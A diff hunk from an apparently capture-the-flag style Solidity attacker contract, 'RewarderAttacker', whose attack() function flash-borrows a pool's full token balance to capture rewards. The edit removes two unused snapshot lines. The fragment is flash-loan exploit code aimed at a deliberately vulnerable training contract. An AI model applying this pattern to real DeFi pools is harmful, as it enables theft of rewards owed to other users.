@@ -19,8 +19,6 @@ contract RewarderAttacker{
 
     function attack() public {
         FlashLoanerPool targetPool = FlashLoanerPool(flashLoanerPool);
-        TheRewarderPool rewarderPool_ = TheRewarderPool(rewarderPool);
-        uint256 snapshotCount = rewarderPool_.lastSnapshotIdForRewards();
         uint256 amount = ERC20(tokenAddress).balanceOf(flashLoanerPool);
         targetPool.flashLoan(amount);
         uint256 returnToOwner = ERC20(rewardToken).balanceOf(address(this));
